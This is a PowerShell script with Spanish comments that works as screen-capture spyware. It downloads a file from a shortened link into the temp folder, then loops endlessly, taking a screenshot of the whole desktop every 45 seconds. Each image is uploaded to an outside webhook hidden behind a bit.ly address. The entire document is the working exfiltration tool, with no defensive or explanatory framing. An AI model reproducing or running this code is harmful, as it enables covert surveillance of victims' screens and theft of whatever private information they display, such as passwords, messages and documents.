# Definir el Webhook URL y el intervalo de tiempo
$hookurl = "https://bit.ly/web_chupakbras"
$seconds = 45 # Intervalo de captura de pantalla en segundos

# Función para enviar la imagen al webhook
function Send-Screenshot {
    param (
        [string]$ImageFile,
        [string]$WebhookURL
    )
    $boundary = [System.Guid]::NewGuid().ToString()
    $LF = "`r`n"
    $bodyLines = (
        "--$boundary",
        "Content-Disposition: form-data; name=`"file1`"; filename=`"screenshot.png`"",
        "Content-Type: image/png$LF",
        (Get-Content -Path $ImageFile -Encoding Byte),
        "--$boundary--$LF"
    )
    $body = $bodyLines -join $LF
    $contentType = "multipart/form-data; boundary=$boundary"
    Invoke-RestMethod -Uri $WebhookURL -Method Post -ContentType $contentType -Body $body
}

# Descargar la imagen desde el enlace
$Filett = "$env:temp\SC.png"
Invoke-WebRequest -Uri "https://bit.ly/Screen_dc" -OutFile $Filett

# Loop para enviar imágenes al webhook cada 45 segundos
while ($true) {
    Add-Type -AssemblyName System.Windows.Forms
    Add-type -AssemblyName System.Drawing
    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $Width = $Screen.Width
    $Height = $Screen.Height
    $Left = $Screen.Left
    $Top = $Screen.Top
    $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
    $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)

    # Enviar la imagen al webhook
    Send-Screenshot -ImageFile $Filett -WebhookURL $hookurl

    # Esperar el intervalo de tiempo especificado
    Start-Sleep -Seconds $seconds
}
